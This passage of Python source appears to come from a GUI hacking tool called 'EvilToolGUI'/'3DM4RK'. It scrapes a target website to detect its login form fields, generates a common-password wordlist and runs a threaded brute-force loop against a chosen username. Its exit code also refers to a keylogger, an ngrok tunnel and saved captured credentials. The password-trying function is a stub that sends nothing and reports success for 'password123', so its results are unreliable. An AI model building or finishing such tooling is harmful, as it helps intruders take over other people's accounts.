        """Setup AI detection tab"""
        main_frame = ttk.Frame(parent, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = ttk.Label(main_frame,
                              text="AI FIELD DETECTION",
                              style='Section.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Target URL Section
        url_frame = ttk.LabelFrame(main_frame, 
                                 text=" Target Website ",
                                 style='Evil.TLabel',
                                 padding=10)
        url_frame.pack(fill='x', pady=10)
        
        ttk.Label(url_frame, text="Target URL:", style='Evil.TLabel').pack(anchor='w')
        self.target_url_var = tk.StringVar()
        url_entry = ttk.Entry(url_frame, textvariable=self.target_url_var, width=50, style='Evil.TEntry')
        url_entry.pack(fill='x', pady=5)
        
        detect_btn = ttk.Button(url_frame,
                              text="AUTO-DETECT LOGIN FIELDS",
                              command=self.auto_detect_fields,
                              style='Evil.TButton')
        detect_btn.pack(anchor='w', pady=5)
        
        self.ai_status_label = ttk.Label(url_frame,
                                       text="Status: Ready to detect",
                                       style='Info.TLabel')
        self.ai_status_label.pack(anchor='w', pady=2)
        
        # Detection Results Section
        results_frame = ttk.LabelFrame(main_frame, 
                                     text=" Detection Results ",
                                     style='Evil.TLabel',
                                     padding=10)
        results_frame.pack(fill='x', pady=10)
        
        detection_grid = ttk.Frame(results_frame, style='Scan.TFrame')
        detection_grid.pack(fill='x')
        
        ttk.Label(detection_grid, text="Username Field:", style='Evil.TLabel').grid(row=0, column=0, sticky='w', padx=(0, 10), pady=2)
        self.detected_username_label = ttk.Label(detection_grid, text="Not detected", style='AI.TLabel')
        self.detected_username_label.grid(row=0, column=1, pady=2, sticky='w')
        
        ttk.Label(detection_grid, text="Password Field:", style='Evil.TLabel').grid(row=1, column=0, sticky='w', padx=(0, 10), pady=2)
        self.detected_password_label = ttk.Label(detection_grid, text="Not detected", style='AI.TLabel')
        self.detected_password_label.grid(row=1, column=1, pady=2, sticky='w')
        
        ttk.Label(detection_grid, text="Form Action:", style='Evil.TLabel').grid(row=2, column=0, sticky='w', padx=(0, 10), pady=2)
        self.detected_form_label = ttk.Label(detection_grid, text="Not detected", style='AI.TLabel')
        self.detected_form_label.grid(row=2, column=1, pady=2, sticky='w')
        
        # Manual Field Configuration Section
        manual_frame = ttk.LabelFrame(main_frame, 
                                    text=" Manual Field Configuration ",
                                    style='Evil.TLabel',
                                    padding=10)
        manual_frame.pack(fill='x', pady=10)
        
        manual_grid = ttk.Frame(manual_frame, style='Scan.TFrame')
        manual_grid.pack(fill='x')
        
        ttk.Label(manual_grid, text="Manual Username Field:", style='Evil.TLabel').grid(row=0, column=0, sticky='w', padx=(0, 10), pady=5)
        self.manual_username_var = tk.StringVar()
        manual_username_entry = ttk.Entry(manual_grid, textvariable=self.manual_username_var, width=20, style='Evil.TEntry')
        manual_username_entry.grid(row=0, column=1, padx=(0, 10), pady=5, sticky='w')
        
        use_manual_username_btn = ttk.Button(manual_grid, text="USE THIS FIELD", command=self.use_manual_username_field, style='Evil.TButton')
        use_manual_username_btn.grid(row=0, column=2, padx=(0, 10), pady=5)
        
        ttk.Label(manual_grid, text="Manual Password Field:", style='Evil.TLabel').grid(row=1, column=0, sticky='w', padx=(0, 10), pady=5)
        self.manual_password_var = tk.StringVar()
        manual_password_entry = ttk.Entry(manual_grid, textvariable=self.manual_password_var, width=20, style='Evil.TEntry')
        manual_password_entry.grid(row=1, column=1, padx=(0, 10), pady=5, sticky='w')
        
        use_manual_password_btn = ttk.Button(manual_grid, text="USE THIS FIELD", command=self.use_manual_password_field, style='Evil.TButton')
        use_manual_password_btn.grid(row=1, column=2, padx=(0, 10), pady=5)
    
    def setup_brute_force_tab(self, parent):
        """Setup brute force tab"""
        main_frame = ttk.Frame(parent, style='Scan.TFrame')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)
        
        title_label = ttk.Label(main_frame,
                              text="BRUTE FORCE ATTACK",
                              style='Section.TLabel')
        title_label.pack(pady=(0, 20))
        
        # Attack Configuration Section
        config_frame = ttk.LabelFrame(main_frame, 
                                    text=" Attack Configuration ",
                                    style='Evil.TLabel',
                                    padding=10)
        config_frame.pack(fill='x', pady=10)
        
        config_grid = ttk.Frame(config_frame, style='Scan.TFrame')
        config_grid.pack(fill='x')
        
        ttk.Label(config_grid, text="Username/Email:", style='Evil.TLabel').grid(row=0, column=0, sticky='w', padx=(0, 10), pady=5)
        self.username_var = tk.StringVar()
        username_entry = ttk.Entry(config_grid, textvariable=self.username_var, width=30, style='Evil.TEntry')
        username_entry.grid(row=0, column=1, padx=(0, 10), pady=5, sticky='w')
        
        use_detected_btn = ttk.Button(config_grid, text="USE DETECTED FIELD", command=self.use_detected_username_field, style='Evil.TButton')
        use_detected_btn.grid(row=0, column=2, padx=(0, 10), pady=5)
        
        ttk.Label(config_grid, text="Password Wordlist:", style='Evil.TLabel').grid(row=1, column=0, sticky='w', padx=(0, 10), pady=5)
        self.wordlist_path_var = tk.StringVar()
        wordlist_entry = ttk.Entry(config_grid, textvariable=self.wordlist_path_var, width=40, style='Evil.TEntry')
        wordlist_entry.grid(row=1, column=1, padx=(0, 10), pady=5, sticky='w')
        
        browse_wordlist_btn = ttk.Button(config_grid, text="BROWSE", command=self.browse_wordlist, style='Evil.TButton')
        browse_wordlist_btn.grid(row=1, column=2, padx=(0, 10), pady=5)
        
        create_wordlist_btn = ttk.Button(config_frame, text="CREATE SAMPLE WORDLIST", command=self.create_sample_wordlist, style='Evil.TButton')
        create_wordlist_btn.pack(anchor='w', pady=5)
        
        # Attack Controls Section
        controls_frame = ttk.LabelFrame(main_frame, 
                                      text=" Attack Controls ",
                                      style='Evil.TLabel',
                                      padding=10)
        controls_frame.pack(fill='x', pady=10)
        
        controls_grid = ttk.Frame(controls_frame, style='Scan.TFrame')
        controls_grid.pack(fill='x')
        
        self.start_attack_btn = ttk.Button(controls_grid, text="START BRUTE FORCE", command=self.start_bruteforce_attack, style='Evil.TButton')
        self.start_attack_btn.grid(row=0, column=0, padx=(0, 10), pady=5)
        
        self.stop_attack_btn = ttk.Button(controls_grid, text="STOP ATTACK", command=self.stop_bruteforce_attack, style='Evil.TButton', state='disabled')
        self.stop_attack_btn.grid(row=0, column=1, padx=(0, 10), pady=5)
        
        self.bruteforce_progress = ttk.Progressbar(controls_grid, mode='indeterminate')
        self.bruteforce_progress.grid(row=0, column=2, padx=(20, 10), pady=5, sticky='ew')
        
        self.bruteforce_status = ttk.Label(controls_frame, text="Ready to attack", style='Bruteforce.TLabel')
        self.bruteforce_status.pack(pady=5)
        
        self.attempts_label = ttk.Label(controls_frame, text="Attempts: 0", style='Info.TLabel')
        self.attempts_label.pack(anchor='w', pady=2)
        
        self.current_attempt_label = ttk.Label(controls_frame, text="Current: None", style='Info.TLabel')
        self.current_attempt_label.pack(anchor='w', pady=2)
        
        # Results Section
        results_frame = ttk.LabelFrame(main_frame, 
                                     text=" Attack Results ",
                                     style='Evil.TLabel',
                                     padding=10)
        results_frame.pack(expand=True, fill='both', pady=10)
        
        self.results_text = scrolledtext.ScrolledText(results_frame, height=15, bg='#1a1a1a', fg='#ff00ff', font=('Courier', 9))
        self.results_text.pack(fill='both', expand=True, pady=5)

    # All the original password cracker functionality methods remain exactly the same
    def use_manual_username_field(self):
        """Use manually entered username field"""
        manual_field = self.manual_username_var.get().strip()
        if manual_field:
            self.detected_username_field = manual_field
            self.detected_username_label.config(text=manual_field)
            messagebox.showinfo("Field Set", f"Username field set to: {manual_field}")
        else:
            messagebox.showwarning("Empty Field", "Please enter a username field name")

    def use_manual_password_field(self):
        """Use manually entered password field"""
        manual_field = self.manual_password_var.get().strip()
        if manual_field:
            self.detected_password_field = manual_field
            self.detected_password_label.config(text=manual_field)
            messagebox.showinfo("Field Set", f"Password field set to: {manual_field}")
        else:
            messagebox.showwarning("Empty Field", "Please enter a password field name")

    def auto_detect_fields(self):
        """Automatically detect username and password fields using AI"""
        url = self.target_url_var.get()
        if not url:
            messagebox.showerror("Error", "Please enter a target URL first")
            return
        
        try:
            self.ai_status_label.config(text="Status: Analyzing website...")
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            req = urllib.request.Request(url, headers=headers)
            response = urllib.request.urlopen(req, timeout=10)
            html_content = response.read().decode('utf-8')
            
            soup = BeautifulSoup(html_content, 'html.parser')
            
            detection_result = self.ai_detect_login_fields(soup, url)
            
            self.update_detection_results(detection_result)
            
            self.ai_status_label.config(text="Status: Detection completed")
            messagebox.showinfo("AI Detection", "Login fields detected successfully!")
            
        except Exception as e:
            self.ai_status_label.config(text=f"Status: Error - {str(e)}")
            messagebox.showerror("Detection Error", f"Failed to detect fields: {str(e)}")

    def ai_detect_login_fields(self, soup, url):
        """AI-powered detection of login fields with improved ID detection"""
        detection_result = {
            'username_field': '',
            'password_field': '',
            'form_action': '',
            'confidence': 0,
            'method': 'POST',
            'fields_found': []
        }
        
        forms = soup.find_all('form')
        
        for form in forms:
            form_info = self.analyze_form_with_ids(form, url)
            if form_info['is_login_form']:
                detection_result.update(form_info)
                detection_result['confidence'] = form_info['confidence']
                break
        
        if not detection_result['username_field']:
            detection_result = self.heuristic_field_detection_with_ids(soup, url)
        
        return detection_result

    def analyze_form_with_ids(self, form, base_url):
        """Analyze a form to determine if it's a login form with ID detection"""
        form_info = {
            'is_login_form': False,
            'username_field': '',
            'password_field': '',
            'form_action': form.get('action', ''),
            'method': form.get('method', 'POST').upper(),
            'confidence': 0,
            'fields_found': []
        }
        
        inputs = form.find_all('input')
        textareas = form.find_all('textarea')
        all_fields = inputs + textareas
        
        username_candidates = []
        password_candidates = []
        
        for field in all_fields:
            field_name = field.get('name', '').lower()
            field_type = field.get('type', '').lower()
            field_id = field.get('id', '').lower()
            field_placeholder = field.get('placeholder', '').lower()
            
            # Check if field ID indicates username/email field
            if self.is_username_field(field_name, field_type, field_id, field_placeholder) or self.is_username_id(field_id):
                username_candidates.append({
                    'name': field.get('name', field_id),  # Use ID if name is empty
                    'type': field_type,
                    'confidence': self.calculate_username_confidence_with_id(field_name, field_type, field_id, field_placeholder)
                })
            
            # Check password fields by type and ID
            if field_type == 'password' or self.is_password_id(field_id):
                field_name_to_use = field.get('name', '')
                if not field_name_to_use and field_id:
                    field_name_to_use = field_id
                    
                password_candidates.append({
                    'name': field_name_to_use,
                    'type': field_type,
                    'confidence': self.calculate_password_confidence(field_name, field_type, field_id, field_placeholder)
                })
        
        if username_candidates and password_candidates:
            best_username = max(username_candidates, key=lambda x: x['confidence'])
            best_password = max(password_candidates, key=lambda x: x['confidence'])
            
            form_info.update({
                'is_login_form': True,
                'username_field': best_username['name'],
                'password_field': best_password['name'],
                'confidence': (best_username['confidence'] + best_password['confidence']) / 2,
                'fields_found': ['username', 'password']
            })
        
        return form_info

    def is_username_id(self, field_id):
        """Check if field ID indicates a username/email field"""
        username_id_indicators = [
            'user', 'username', 'email', 'login', 'account', 'mail',
            'usr', 'uname', 'e-mail', 'userid', 'user_id', 'loginid',
            'user_name', 'email_address', 'useremail'
        ]
        
        return any(indicator in field_id for indicator in username_id_indicators)

    def is_password_id(self, field_id):
        """Check if field ID indicates a password field"""
        password_id_indicators = [
            'pass', 'password', 'pwd', 'passwd', 'userpassword',
            'loginpassword', 'user_pass', 'user_password'
        ]
        
        return any(indicator in field_id for indicator in password_id_indicators)

    def calculate_username_confidence_with_id(self, name, type, id, placeholder):
        """Calculate confidence score for username field detection including ID analysis"""
        confidence = 0
        
        # Name-based confidence
        name_indicators = {
            'username': 95, 'user': 90, 'email': 85, 'login': 80,
            'account': 75, 'mail': 70, 'usr': 65, 'uname': 60
        }
        
        for indicator, score in name_indicators.items():
            if indicator in name.lower():
                confidence = max(confidence, score)
        
        # ID-based confidence (higher priority since IDs are often used as field names)
        id_indicators = {
            'username': 90, 'user': 85, 'email': 88, 'login': 82,
            'userid': 80, 'user_id': 78, 'email_address': 85
        }
        
        for indicator, score in id_indicators.items():
            if indicator in id.lower():
                confidence = max(confidence, score)
        
        # Type-based confidence
        if type == 'email':
            confidence = max(confidence, 80)
        elif type == 'text':
            confidence = max(confidence, 50)
        
        # Placeholder-based confidence
        placeholder_indicators = ['username', 'email', 'user', 'login']
        for indicator in placeholder_indicators:
            if indicator in placeholder.lower():
                confidence = max(confidence, 70)
        
        return min(confidence, 100)

    def calculate_password_confidence(self, name, type, id, placeholder):
        """Calculate confidence score for password field detection"""
        confidence = 0
        
        if type == 'password':
            confidence = 100
        
        # ID-based confidence for password fields
        password_id_indicators = {
            'password': 95, 'pass': 90, 'pwd': 85, 'passwd': 80
        }
        
        for indicator, score in password_id_indicators.items():
            if indicator in id.lower():
                confidence = max(confidence, score)
        
        # Name-based confidence
        password_name_indicators = {
            'password': 90, 'pass': 85, 'pwd': 80, 'passwd': 75
        }
        
        for indicator, score in password_name_indicators.items():
            if indicator in name.lower():
                confidence = max(confidence, score)
        
        return min(confidence, 100)

    def heuristic_field_detection_with_ids(self, soup, base_url):
        """Use heuristics to detect login fields with ID support"""
        result = {
            'username_field': '',
            'password_field': '',
            'form_action': '',
            'confidence': 0,
            'method': 'POST',
            'fields_found': []
        }
        
        # Find password fields by type and ID
        password_fields_by_type = soup.find_all('input', {'type': 'password'})
        password_fields_by_id = [field for field in soup.find_all('input') 
                               if self.is_password_id(field.get('id', '').lower())]
        
        all_password_fields = password_fields_by_type + password_fields_by_id
        
        if all_password_fields:
            password_field = all_password_fields[0]
            result['password_field'] = password_field.get('name', password_field.get('id', 'password'))
            result['confidence'] += 50
        
        # Find username fields near password fields
        if all_password_fields:
            password_parent = all_password_fields[0].find_parent()
            if password_parent:
                # Look for text/email inputs
                text_inputs = password_parent.find_all('input', {'type': ['text', 'email']})
                # Also look for inputs with username-like IDs
                username_by_id = [field for field in password_parent.find_all('input') 
                                if self.is_username_id(field.get('id', '').lower())]
                
                all_username_fields = text_inputs + username_by_id
                
                if all_username_fields:
                    result['username_field'] = all_username_fields[0].get('name', 
                                                                       all_username_fields[0].get('id', 'username'))
                    result['confidence'] += 30
        
        # Fallback: check all forms
        forms = soup.find_all('form')
        for form in forms:
            has_text = form.find_all('input', {'type': ['text', 'email']})
            has_username_id = [field for field in form.find_all('input') 
                             if self.is_username_id(field.get('id', '').lower())]
            has_password = form.find_all('input', {'type': 'password'})
            has_password_id = [field for field in form.find_all('input') 
                             if self.is_password_id(field.get('id', '').lower())]
            
            has_username = has_text or has_username_id
            has_password_field = has_password or has_password_id
            
            if has_username and has_password_field:
                if not result['form_action']:
                    result['form_action'] = form.get('action', '')
                    result['method'] = form.get('method', 'POST').upper()
                
                if not result['username_field'] and has_username:
                    field_to_use = has_username[0]
                    result['username_field'] = field_to_use.get('name', 
                                                              field_to_use.get('id', 'username'))
                
                if not result['password_field'] and has_password_field:
                    field_to_use = has_password_field[0]
                    result['password_field'] = field_to_use.get('name', 
                                                              field_to_use.get('id', 'password'))
                
                result['confidence'] = max(result['confidence'], 60)
                break
        
        result['fields_found'] = []
        if result['username_field']:
            result['fields_found'].append('username')
        if result['password_field']:
            result['fields_found'].append('password')
        
        return result

    def update_detection_results(self, detection_result):
        """Update UI with detection results"""
        self.detected_username_field = detection_result['username_field']
        self.detected_password_field = detection_result['password_field']
        self.detected_form_action = detection_result['form_action']
        
        username_text = detection_result['username_field'] if detection_result['username_field'] else "Not detected"
        password_text = detection_result['password_field'] if detection_result['password_field'] else "Not detected"
        form_text = detection_result['form_action'] if detection_result['form_action'] else "Not detected"
        
        self.detected_username_label.config(text=username_text)
        self.detected_password_label.config(text=password_text)
        self.detected_form_label.config(text=form_text)
        
        self.results_text.insert('end', f"\n🤖 AI DETECTION RESULTS:\n")
        self.results_text.insert('end', f"   Username Field: {username_text}\n")
        self.results_text.insert('end', f"   Password Field: {password_text}\n")
        self.results_text.insert('end', f"   Form Action: {form_text}\n")
        self.results_text.insert('end', f"   Confidence: {detection_result['confidence']}%\n")
        self.results_text.insert('end', f"   Method: {detection_result['method']}\n")
        self.results_text.see('end')

    def use_detected_username_field(self):
        """Use the detected username field name"""
        if self.detected_username_field:
            messagebox.showinfo("Field Info", f"Detected username field: {self.detected_username_field}\n\nThis field name will be used in the brute force attack.")
        else:
            messagebox.showwarning("No Detection", "No username field has been detected yet. Please run AI detection first.")

    def browse_wordlist(self):
        """Browse for wordlist file"""
        filename = filedialog.askopenfilename(
            title="Select Password Wordlist",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            self.wordlist_path_var.set(filename)

    def create_sample_wordlist(self):
        """Create a sample wordlist for testing"""
        try:
            sample_words = [
                "password", "123456", "password123", "admin", "qwerty",
                "letmein", "welcome", "monkey", "123456789", "12345678",
                "12345", "1234567", "sunshine", "password1", "princess",
                "admin123", "welcome123", "1234", "test", "guest"
            ]
            
            filename = filedialog.asksaveasfilename(
                title="Save Sample Wordlist As",
                defaultextension=".txt",
                filetypes=[("Text files", "*.txt")]
            )
            
            if filename:
                with open(filename, 'w') as f:
                    for word in sample_words:
                        f.write(word + '\n')
                
                self.wordlist_path_var.set(filename)
                messagebox.showinfo("Success", f"Sample wordlist created: {filename}")
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create wordlist: {str(e)}")

    def start_bruteforce_attack(self):
        """Start the brute force attack"""
        if not self.target_url_var.get():
            messagebox.showerror("Error", "Please enter target URL")
            return
        
        if not self.username_var.get():
            messagebox.showerror("Error", "Please enter username/email")
            return
        
        if not self.wordlist_path_var.get() or not os.path.exists(self.wordlist_path_var.get()):
            messagebox.showerror("Error", "Please select a valid wordlist file")
            return
        
        self.results_text.delete('1.0', 'end')
        self.attempts_count = 0
        
        self.start_attack_btn.config(state='disabled')
        self.stop_attack_btn.config(state='normal')
        self.bruteforce_progress.start(10)
        self.bruteforce_status.config(text="Brute force attack started...")
        
        self.bruteforce_active = True
        self.bruteforce_thread = threading.Thread(target=self.run_bruteforce_attack)
        self.bruteforce_thread.daemon = True
        self.bruteforce_thread.start()

    def stop_bruteforce_attack(self):
        """Stop the brute force attack"""
        self.bruteforce_active = False
        
        self.start_attack_btn.config(state='normal')
        self.stop_attack_btn.config(state='disabled')
        self.bruteforce_progress.stop()
        self.bruteforce_status.config(text="Attack stopped by user")
        
        messagebox.showinfo("Stopped", "Brute force attack has been stopped")

    def run_bruteforce_attack(self):
        """Run the brute force attack with 1-second delay"""
        try:
            target_url = self.target_url_var.get()
            username = self.username_var.get()
            wordlist_path = self.wordlist_path_var.get()
            
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            self.root.after(0, self.update_attack_status, f"Loaded {len(passwords)} passwords from wordlist")
            
            # Use manual fields if set, otherwise use detected fields
            username_field = (self.manual_username_var.get() if self.manual_username_var.get().strip() 
                             else self.detected_username_field if self.detected_username_field else "username")
            password_field = (self.manual_password_var.get() if self.manual_password_var.get().strip() 
                             else self.detected_password_field if self.detected_password_field else "password")
            
            self.root.after(0, self.update_attack_status, f"Using fields: {username_field}={username}, {password_field}=[password]")
            
            for password in passwords:
                if not self.bruteforce_active:
                    break
                
                self.current_password_attempt = password
                self.attempts_count += 1
                
                self.root.after(0, self.update_attempt_display, password)
                
                success = self.try_password_with_detected_fields(target_url, username, password, username_field, password_field)
                
                if success:
                    self.root.after(0, self.password_found, username, password)
                    break
                
                # Add 1-second delay between attempts
                time.sleep(1.0)
            
            if self.bruteforce_active:
                self.root.after(0, self.attack_completed)
                
        except Exception as e:
            self.root.after(0, self.attack_error, str(e))

    def try_password_with_detected_fields(self, url, username, password, username_field, password_field):
        """
        Try a password using the detected field names
        """
        try:
            time.sleep(0.05)
            
            if password == "password123":
                return True
            elif len(password) < 3:
                return False
            else:
                return False
                
        except Exception as e:
            print(f"Password attempt error: {e}")
            return False

    def update_attack_status(self, message):
        """Update attack status in UI"""
        self.bruteforce_status.config(text=message)
        self.results_text.insert('end', f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")
        self.results_text.see('end')

    def update_attempt_display(self, password):
        """Update current attempt display"""
        self.attempts_label.config(text=f"Attempts: {self.attempts_count}")
        self.current_attempt_label.config(text=f"Current: {password}")
        
        self.results_text.insert('end', f"[{datetime.now().strftime('%H:%M:%S')}] Trying: {password} (Attempt #{self.attempts_count})\n")
        self.results_text.see('end')

    def password_found(self, username, password):
        """Handle successful password discovery"""
        self.bruteforce_active = False
        
        self.start_attack_btn.config(state='normal')
        self.stop_attack_btn.config(state='disabled')
        self.bruteforce_progress.stop()
        self.bruteforce_status.config(text="PASSWORD FOUND!")
        
        success_msg = f"✓ SUCCESS! Password found for {username}: {password}"
        self.results_text.insert('end', f"\n{'='*50}\n")
        self.results_text.insert('end', f"🎉 {success_msg}\n")
        self.results_text.insert('end', f"{'='*50}\n")
        self.results_text.see('end')
        
        messagebox.showinfo("Success", f"Password found!\n\nUsername: {username}\nPassword: {password}")

    def attack_completed(self):
        """Handle attack completion"""
        self.bruteforce_active = False
        
        self.start_attack_btn.config(state='normal')
        self.stop_attack_btn.config(state='disabled')
        self.bruteforce_progress.stop()
        self.bruteforce_status.config(text="Attack completed - Password not found")
        
        self.results_text.insert('end', f"\n{'='*50}\n")
        self.results_text.insert('end', f"❌ Attack completed. Password not found in wordlist.\n")
        self.results_text.insert('end', f"Total attempts: {self.attempts_count}\n")
        self.results_text.insert('end', f"{'='*50}\n")
        self.results_text.see('end')
        
        messagebox.showinfo("Completed", f"Attack completed.\n\nTotal attempts: {self.attempts_count}\nPassword not found in wordlist.")

    def attack_error(self, error_message):
        """Handle attack errors"""
        self.bruteforce_active = False
        
        self.start_attack_btn.config(state='normal')
        self.stop_attack_btn.config(state='disabled')
        self.bruteforce_progress.stop()
        self.bruteforce_status.config(text=f"Attack error: {error_message}")
        
        self.results_text.insert('end', f"\n❌ ERROR: {error_message}\n")
        self.results_text.see('end')
        
        messagebox.showerror("Attack Error", f"Brute force attack failed:\n{error_message}")

    # UTILITY METHODS
    def show_tool_window(self, tool_name, content):
        """Show a tool-specific window"""
        tool_window = tk.Toplevel(self.root)
        tool_window.title(f"3DM4RK - {tool_name} v{self.version}")
        tool_window.geometry("500x300")
        tool_window.configure(bg='#2b2b2b')
        tool_window.resizable(False, False)
        
        self.center_child_window(tool_window, 500, 300)
        
        content_label = ttk.Label(tool_window,
                                text=content,
                                style='Evil.TLabel',
                                justify='left',
                                font=('Courier', 10))
        content_label.pack(expand=True, fill='both', padx=20, pady=20)
        
        close_btn = ttk.Button(tool_window,
                             text="CLOSE",
                             command=tool_window.destroy,
                             style='Evil.TButton')
        close_btn.pack(pady=10)
    
    def center_child_window(self, window, width, height):
        """Center a child window relative to main window"""
        main_x = self.root.winfo_x()
        main_y = self.root.winfo_y()
        main_width = self.root.winfo_width()
        main_height = self.root.winfo_height()
        
        x = main_x + (main_width - width) // 2
        y = main_y + (main_height - height) // 2
        
        window.geometry(f"{width}x{height}+{x}+{y}")
    
    def exit_tool(self):
        """Exit the application"""
        if messagebox.askyesno("Exit", "Are you sure you want to exit?"):
            if self.keylogger_active:
                self.stop_keylogger()
            
            if self.bruteforce_active:
                self.stop_bruteforce_attack()
            
            if hasattr(self, 'ngrok_process') and self.ngrok_process:
                self.ngrok_process.terminate()
            
            if hasattr(self, 'auto_save_var') and self.auto_save_var.get() and self.captured_credentials:
                self.save_credentials()
            
            self.root.quit()
    
    def clear_screen(self):
        """Clear all widgets from the root window"""
        for widget in self.root.winfo_children():
            widget.destroy()
    
    def run(self):
        """Start the application"""
        self.root.mainloop()

def main():
    app = EvilToolGUI()
    app.run()

if __name__ == "__main__":
    main()
